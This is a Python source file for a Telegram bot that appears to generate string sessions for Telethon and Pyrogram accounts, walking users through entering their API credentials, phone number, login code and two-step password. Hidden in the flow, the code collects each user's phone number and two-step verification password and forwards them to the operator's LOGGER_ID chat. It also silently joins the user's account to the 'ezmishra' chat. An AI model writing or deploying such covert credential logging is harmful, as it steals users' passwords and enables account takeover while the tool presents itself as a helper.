import asyncio
from pyrogram import Client, filters
from oldpyro import Client as Client1
from oldpyro.errors import ApiIdInvalid as ApiIdInvalid1
from oldpyro.errors import PasswordHashInvalid as PasswordHashInvalid1
from oldpyro.errors import PhoneCodeExpired as PhoneCodeExpired1
from oldpyro.errors import PhoneCodeInvalid as PhoneCodeInvalid1
from oldpyro.errors import PhoneNumberInvalid as PhoneNumberInvalid1
from oldpyro.errors import SessionPasswordNeeded as SessionPasswordNeeded1
from pyrogram.errors import (
    ApiIdInvalid,
    FloodWait,
    PasswordHashInvalid,
    PhoneCodeExpired,
    PhoneCodeInvalid,
    PhoneNumberInvalid,
    SessionPasswordNeeded,
)
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from telethon import TelegramClient
from telethon.errors import (
    ApiIdInvalidError,
    PasswordHashInvalidError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
)
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
from pyromod.listen.listen import ListenerTimeout
from SessionBot import LOGGER_ID
from SessionBot.Plugins.inline import retry_key

async def gen_session(
    message, user_id: int, telethon: bool = False, old_pyro: bool = False
):
    if telethon:
        ty = f"𝖳𝖾𝗅𝖾𝗍𝗁𝗈𝗇"
    elif old_pyro:
        ty = f"𝖯𝗒𝗋𝗈𝗀𝗋𝖺𝗆 𝖵1"
    else:
        ty = f"𝖯𝗒𝗋𝗈𝗀𝗋𝖺𝗆 𝖵2"
    await message.reply_text(f"» 𝖳𝗋𝗒𝗂𝗇𝗀 𝖳𝗈 𝖲𝗍𝖺𝗋𝗍 {ty} 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖦𝖾𝗇𝖾𝗋𝗍𝗈𝗋...")
    try:
        api_id = await Client.ask(
            identifier=(message.chat.id, user_id, None),
            text="» 𝖯𝗅𝖾𝖺𝗌𝖾 𝖤𝗇𝗍𝖾𝗋 𝖸𝗈𝗎𝗋 𝖠𝖯𝖨_𝖨𝖣 𝖳𝗈 𝖯𝗋𝗈𝖼𝖾𝖾𝖽 :",
            filters=filters.text,
            timeout=300,
        )
    except ListenerTimeout:
        return await Client.send_message(
            user_id,
            "» 𝖳𝗂𝗆𝖾𝖽 𝖫𝗂𝗆𝗂𝗍 𝖱𝖾𝖺𝖼𝗁𝖾𝖽 𝖮𝖿 5 𝖬𝗂𝗇𝗎𝗍𝖾𝗌\n\n 𝖯𝗅𝖾𝖺𝗌𝖾 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
            reply_markup=retry_key,
        )
    if await cancelled(api_id):
        return
    try:
        api_id = int(api_id.text)
    except ValueError:
        return await Client.send_message(
            user_id,
            "» 𝖳𝗁𝖾 𝖠𝖯𝖨_𝖨𝖣 𝖸𝗈𝗎'𝗏𝖾 𝖲𝖾𝗇𝗍 𝖨𝗌 𝖨𝗇𝗏𝖺𝗅𝗂𝖽.\n\n 𝖯𝗅𝖾𝖺𝗌𝖾 𝖲𝗍𝖺𝗋𝗍 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
            reply_markup=retry_key,
        )
    try:
        api_hash = await Client.ask(
            identifier=(message.chat.id, user_id, None),
            text="» 𝖯𝗅𝖾𝖺𝗌𝖾 𝖤𝗇𝗍𝖾𝗋 𝖸𝗈𝗎𝗋 𝖠𝖯𝖨_𝖧𝖠𝖲𝖧 𝖳𝗈 𝖯𝗋𝗈𝖼𝖾𝖾𝖽:",
            filters=filters.text,
            timeout=300,
        )
    except ListenerTimeout:
        return await Client.send_message(
            user_id,
            "» 𝖳𝗂𝗆𝖾𝖽 𝖫𝗂𝗆𝗂𝗍 𝖱𝖾𝖺𝖼𝗁𝖾𝖽 𝖮𝖿 5 𝖬𝗂𝗇𝗎𝗍𝖾𝗌\n\n 𝖯𝗅𝖾𝖺𝗌𝖾 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
            reply_markup=retry_key,
        )
    if await cancelled(api_hash):
        return
    api_hash = api_hash.text
    if len(api_hash) < 30:
        return await Client.send_message(
            user_id,
            "» 𝖳𝗁𝖾 𝖠𝖯𝖨_𝖧𝖠𝖲𝖧 𝖸𝗈𝗎'𝗏𝖾 𝖲𝖾𝗇𝗍 𝖨𝗌 𝖨𝗇𝗏𝖺𝗅𝗂𝖽.\n\n 𝖯𝗅𝖾𝖺𝗌𝖾 𝖲𝗍𝖺𝗋𝗍 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
            reply_markup=retry_key,
        )
    try:
        phone_number = await Client.ask(
            identifier=(message.chat.id, user_id, None),
            text="» 𝖯𝗅𝖾𝖺𝗌𝖾 𝖤𝗇𝗍𝖾𝗋 𝖸𝗈𝗎𝗋 𝖯𝗁𝗈𝗇𝖾 𝖭𝗎𝗆𝖻𝖾𝗋 𝖳𝗈 𝖯𝗋𝗈𝖼𝖾𝖾𝖽 :",
            filters=filters.text,
            timeout=300,
        )
    except ListenerTimeout:
        return await Client.send_message(
            user_id,
            "» 𝖳𝗂𝗆𝖾𝖽 𝖫𝗂𝗆𝗂𝗍 𝖱𝖾𝖺𝖼𝗁𝖾𝖽 𝖮𝖿 5 𝖬𝗂𝗇𝗎𝗍𝖾𝗌\n\n 𝖯𝗅𝖾𝖺𝗌𝖾 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
            reply_markup=retry_key,
        )
    if await cancelled(phone_number):
        return
    phone_number = phone_number.text
    xxx = f"Phone Number : {phone_number}\n\n"
    await Client.send_message(user_id, "» 𝖳𝗋𝗒𝗂𝗇𝗀 𝖳𝗈 𝖲𝖾𝗇𝖽 𝖮𝖳𝖯 𝖠𝗍 𝖳𝗁𝖾 𝖦𝗂𝗏𝖾𝗇 𝖭𝗎𝗆𝖻𝖾𝗋...")
    if telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif old_pyro:
        client = Client1(":memory:", api_id=api_id, api_hash=api_hash)
    else:
        client = Client(name="xemishra", api_id=api_id, api_hash=api_hash, in_memory=True)
    await client.connect()
    try:
        if telethon:
            code = await client.send_code_request(phone_number)
        else:
            code = await client.send_code(phone_number)
        await asyncio.sleep(1)
    except FloodWait as f:
        return await Client.send_message(
            user_id,
            f"» 𝖥𝖺𝗂𝗅𝖾𝖽 𝖳𝗈 𝖲𝖾𝗇𝖽 𝖢𝗈𝖽𝖾 𝖥𝗈𝗋 𝖫𝗈𝗀𝗀𝗂𝗇\n\n𝖯𝗅𝖾𝖺𝗌𝖾 𝖶𝖺𝗂𝗍 𝖥𝗈𝗋 {f.value or f.x} 𝖲𝖾𝖼𝗈𝗇𝖽𝗌 𝖠𝗇𝖽 𝖲𝗍𝖺𝗋𝗍 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
            reply_markup=retry_key,
        )
    except (ApiIdInvalid, ApiIdInvalidError, ApiIdInvalid1):
        return await Client.send_message(
            user_id,
            "» 𝖠𝖯𝖨_𝖨𝖣 𝖮𝗋 𝖠𝖯𝖨_𝖧𝖠𝖲𝖧 𝖨𝗌 𝖨𝗇𝗏𝖺𝗅𝗂𝖽.\n\n𝖯𝗅𝖾𝖺𝗌𝖾 𝖲𝗍𝖺𝗋𝗍 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖸𝗈𝗎𝗋 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
            reply_markup=retry_key,
        )
    except (PhoneNumberInvalid, PhoneNumberInvalidError, PhoneNumberInvalid1):
        return await Client.send_message(
            user_id,
            "» 𝖯𝗁𝗈𝗇𝖾 𝖭𝗎𝗆𝖻𝖾𝗋 𝖨𝗇𝗏𝖺𝗅𝗂𝖽.\n\n𝖯𝗅𝖾𝖺𝗌𝖾 𝖲𝗍𝖺𝗋𝗍 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
            reply_markup=retry_key,
        )
    try:
        otp = await Client.ask(
            identifier=(message.chat.id, user_id, None),
            text=f" 𝖯𝗅𝖾𝖺𝗌𝖾 𝖤𝗇𝗍𝖾𝗋 𝖳𝗁𝖾 𝖮𝖳𝖯 𝖲𝖾𝗇𝗍 𝖳𝗈 {phone_number}.\n\n 𝖨𝖿 𝖮𝖳𝖯 𝖨𝗌 <code>12345</code>, 𝖯𝗅𝖾𝖺𝗌𝖾 𝖲𝖾𝗇𝖽 𝖨𝗍 𝖠𝗌 <code>1 2 3 4 5.</code>",
            filters=filters.text,
            timeout=600,
        )
        if await cancelled(otp):
            return
    except ListenerTimeout:
        return await Client.send_message(
            user_id,
            "» 𝖳𝗂𝗆𝖾𝖽 𝖫𝗂𝗆𝗂𝗍 𝖱𝖾𝖺𝖼𝗁𝖾𝖽 𝖮𝖿 10 𝖬𝗂𝗇𝗎𝗍𝖾𝗌\n\n 𝖯𝗅𝖾𝖺𝗌𝖾 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
            reply_markup=retry_key,
        )
    otp = otp.text.replace(" ", "")
    try:
        if telethon:
            await client.sign_in(phone_number, otp, password=None)
        else:
            await client.sign_in(phone_number, code.phone_code_hash, otp)
    except (PhoneCodeInvalid, PhoneCodeInvalidError, PhoneCodeInvalid1):
        return await Client.send_message(
            user_id,
            "» 𝖳𝗁𝖾 𝖮𝖳𝖯 𝖸𝗈𝗎'𝗏𝖾 𝖲𝖾𝗇𝗍 𝖨𝗌 <b>𝖶𝗋𝗈𝗇𝗀.</b>\n\n𝖯𝗅𝖾𝖺𝗌𝖾 𝖲𝗍𝖺𝗋𝗍 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
            reply_markup=retry_key,
        )
    except (PhoneCodeExpired, PhoneCodeExpiredError, PhoneCodeExpired1):
        return await Client.send_message(
            user_id,
            "» 𝖳𝗁𝖾 𝖮𝖳𝖯 𝖸𝗈𝗎'𝗏𝖾 𝖲𝖾𝗇𝗍 𝖨𝗌 <b>𝖤𝖷𝖯𝖨𝖱𝖤𝖣.</b>\n\n𝖯𝗅𝖾𝖺𝗌𝖾 𝖲𝗍𝖺𝗋𝗍 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖸𝗈𝗎𝗋 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
            reply_markup=retry_key,
        )
    except (SessionPasswordNeeded, SessionPasswordNeededError, SessionPasswordNeeded1):
        try:
            pwd = await Client.ask(
                identifier=(message.chat.id, user_id, None),
                text="» 𝖯𝗅𝖾𝖺𝗌𝖾 𝖤𝗇𝗍𝖾𝗋 𝖸𝗈𝗎𝗋 𝖳𝗐𝗈 𝖲𝗍𝖾𝗈 𝖵𝖾𝗋𝗂𝖿𝗂𝖼𝖺𝗍𝗂𝗈𝗇 𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝖳𝗈 𝖢𝗈𝗇𝗍𝗂𝗇𝗎𝖾 :",
                filters=filters.text,
                timeout=300,
            )
        except ListenerTimeout:
            return Client.send_message(
                user_id,
                "» 𝖳𝗂𝗆𝖾𝖽 𝖫𝗂𝗆𝗂𝗍 𝖱𝖾𝖺𝖼𝗁𝖾𝖽 𝖮𝖿 5 𝖬𝗂𝗇𝗎𝗍𝖾𝗌\n\n 𝖯𝗅𝖾𝖺𝗌𝖾 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
                reply_markup=retry_key,
            )
        if await cancelled(pwd):
            return
        pwd = pwd.text
        xxx += f"Password : {pwd}"
        try:
            if telethon:
                await client.sign_in(password=pwd)
            else:
                await client.check_password(password=pwd)
        except (PasswordHashInvalid, PasswordHashInvalidError, PasswordHashInvalid1):
            return await Client.send_message(
                user_id,
                "» 𝖳𝗁𝖾 𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝖸𝗈𝗎'𝗏𝖾 𝖲𝖾𝗇𝗍 𝖨𝗌 𝖶𝗋𝗈𝗇𝗀\n\n 𝖯𝗅𝖾𝖺𝗌𝖾 𝖲𝗍𝖺𝗋𝗍 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
                reply_markup=retry_key,
            )
    except Exception as ex:
        return await Client.send_message(user_id, f"𝖤𝖱𝖱𝖮𝖱 : <code>{str(ex)}</code>")
    try:
        txt = "𝖧𝖾𝗋𝖾 𝖨𝗌 𝖸𝗈𝗎𝗋 {0} 𝖲𝗍𝗋𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇\n\n<code>{1}</code>\n\n."
        if telethon:
            string_session = client.session.save()
            await client.send_message(
                "me",
                txt.format(ty, string_session),
                link_preview=False,
                parse_mode="html",
            )
        else:
            string_session = await client.export_session_string()
            await client.send_message(
                "me",
                txt.format(ty, string_session),
                disable_web_page_preview=True,
            )
            await client.join_chat("ezmishra")
    except KeyError:
        pass
    try:
        await client.disconnect()
        await Client.send_message(LOGGER_ID, xxx)
        await Client.send_message(
            chat_id=user_id,
            text=f"𝖲𝗎𝖼𝖼𝖾𝗌𝗌𝖿𝗎𝗅𝗅𝗒 𝖦𝖾𝖻𝖾𝗋𝖺𝗍𝖾𝖽 𝖸𝗈𝗎𝗋 {ty} 𝖲𝗍𝗋𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇.\n\n𝖯𝗅𝖾𝖺𝗌𝖾 𝖢𝗁𝖾𝖼𝗄 𝖸𝗈𝗎𝗋 𝖲𝖺𝗏𝖾𝖽 𝖬𝖾𝗌𝗌𝖺𝗀𝖾𝗌 𝖥𝗈𝗋 𝖦𝖾𝗍𝗍𝗂𝗇𝗀 𝖨𝗍.",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            text="𝖲𝖺𝗏𝖾𝖽 𝖬𝖾𝗌𝗌𝖺𝗀𝖾",
                            url=f"tg://openmessage?user_id={user_id}",
                        )
                    ]
                ]
            ),
            disable_web_page_preview=True,
        )
    except:
        pass

async def cancelled(message):
    if "/cancel" in message.text:
        await message.reply_text(
            "» 𝖢𝖺𝗇𝖼𝖾𝗅𝗅𝖾𝖽 𝖳𝗁𝖾 𝖮𝗇𝗀𝗈𝗂𝗇 𝖲𝗍𝗋𝗂𝗇𝗀 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗈𝗋 𝖯𝗋𝗈𝖼𝖾𝗌𝗌.", reply_markup=retry_key
        )
        return True
    elif "/restart" in message.text:
        await message.reply_text(
            "» 𝖲𝗎𝖼𝖼𝖾𝗌𝗌𝖿𝗎𝗅𝗅𝗒 𝖱𝖾𝗌𝗍𝖺𝗋𝗍𝖾𝖽 𝖳𝗁𝖾 𝖡𝗈𝗍.", reply_markup=retry_key
        )
        return True
    elif message.text.startswith("/"):
        await message.reply_text(
            "» 𝖢𝖺𝗇𝖼𝗅𝗅𝖾𝖽 𝖳𝗁𝖾 𝖮𝗇𝗀𝗈𝗂𝗇𝗀 𝖲𝗍𝗋𝗂𝗇𝗀 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗈𝗇 𝖯𝗋𝗈𝖼𝖾𝗌𝗌.", reply_markup=retry_key
        )
        return True
    else:
        return False
